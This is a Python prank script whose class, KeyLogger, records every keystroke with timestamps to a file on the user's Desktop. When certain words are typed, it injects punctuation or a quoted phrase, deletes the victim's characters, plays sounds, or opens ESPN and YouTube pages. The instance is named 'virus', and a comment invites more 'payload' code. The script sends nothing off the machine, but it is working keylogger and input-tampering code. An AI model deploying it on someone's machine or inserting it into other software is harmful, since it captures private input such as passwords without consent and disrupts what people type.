from pynput.keyboard import Key, Listener, Controller
import logging, os, webbrowser, time
from playsound import playsound


class KeyLogger:
    def __init__(self, fileName='\Key_log.txt'):
        self.log_dir = os.path.expanduser('~/Desktop')

        logging.basicConfig(filename=(self.log_dir + fileName),
                            level=logging.DEBUG,
                            format='%(asctime)s: %(message)s')

        self.coolList = []

        self.a = 0
        self.b = 5

    def on_press(self, key):
        logging.info(key)
        if key == Key.backspace and self.b > self.a:
            self.b -= 1
            self.event_delete(True)
        if key == Key.backspace and len(self.coolList) > 0:
            self.coolList.pop()
        if key != Key.caps_lock and key != Key.shift and key != Key.backspace:
            self.coolList.append(str(key).lower())
            self.check()
            self.a = 0
            self.b = 5

    def run(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    # stop function is not working right now
    def stop(self):
        Listener(on_press=self.on_press).stop()
        
    def check(self):
        #print(self.coolList)
        if self.event_cool():
            return
        if self.event_what():
            return
        if self.event_texas_is_back():
            return
        if self.event_famous_quotes():
            return
        if self.event_delete():
            return
        # New payload goes here...

    def event_cool(self):
        checkList = self.coolList[-4:]
        event_cool = ["'c'", "'o'", "'o'", "'l'"]
        if checkList == event_cool:
            print('COOL!!!')
            keyboard = Controller()
            with keyboard.pressed(Key.shift):
                keyboard.press('1')
            with keyboard.pressed(Key.shift):
                keyboard.press('1')
            with keyboard.pressed(Key.shift):
                keyboard.press('1')
            playsound('cool.wav')
            return True
        return False

    def event_what(self):
        event_what = [
            ["'w'", "'h'", "'a'", "'t'"],
            ["'h'", "'o'", "'w'"],
            ["'w'", "'h'", "'e'", "'n'"],
            ["'w'", "'h'", "'e'", "'r'", "'e'"],
            ["'w'", "'h'", "'y'"]
            ]
        for i in event_what:
            length = len(i) * -1
            checkList = self.coolList[length:]
            if checkList == i:
                keyboard = Controller()
                with keyboard.pressed(Key.shift):
                    keyboard.press('/')
                with keyboard.pressed(Key.shift):
                    keyboard.press('/')
                with keyboard.pressed(Key.shift):
                    keyboard.press('/')
                playsound('what.wav')
                return True
        return False

    def event_texas_is_back(self):
        checkList = self.coolList[-5:]
        event_texas_is_back = ["'t'", "'e'", "'x'", "'a'", "'s'"]
        if checkList == event_texas_is_back:
            webbrowser.open('www.espn.com/college-football/rankings')
            return True
        return False

    def event_famous_quotes(self):
        checkList = self.coolList[-5:]
        event_tobe = ["'t'", "'o'", 'key.space', "'b'", "'e'"]
        if checkList == event_tobe:
            keyboard = Controller()
            keyboard.type(', or not to-be, that is the question')
            return True

        checkList = self.coolList[-3:]
        event_get_off_my_lawn = ["'g'", "'e'", "'t'"]
        if checkList == event_get_off_my_lawn:
            webbrowser.open('https://www.youtube.com/watch?v=z7X2_V60YK8')
            return True
        return False

    def event_delete(self, backspace=False):
        if backspace == True:
            keyboard = Controller()
            keyboard.press(Key.backspace)
            time.sleep(0.01)
            return
        
        checkList = self.coolList[-4:]
        event_back = ["'b'", "'a'", "'c'", "'k'"]
        if checkList == event_back:
            keyboard = Controller()
            keyboard.press(Key.backspace)
            time.sleep(0.1)
            keyboard.press(Key.backspace)
            time.sleep(0.1)
            keyboard.press(Key.backspace)
            time.sleep(0.1)
            keyboard.press(Key.backspace)
            playsound('back.wav')
            return True

        checkList = self.coolList[-3:]
        event_del = ["'d'", "'e'", "'l'"]
        if checkList == event_del:
            keyboard = Controller()
            keyboard.press(Key.backspace)
            time.sleep(0.1)
            keyboard.press(Key.backspace)
            time.sleep(0.1)
            keyboard.press(Key.backspace)
            playsound('delete.wav')
            return True
        return False

def main():
    virus = KeyLogger()
    virus.run()

if __name__ == '__main__':
    main()
















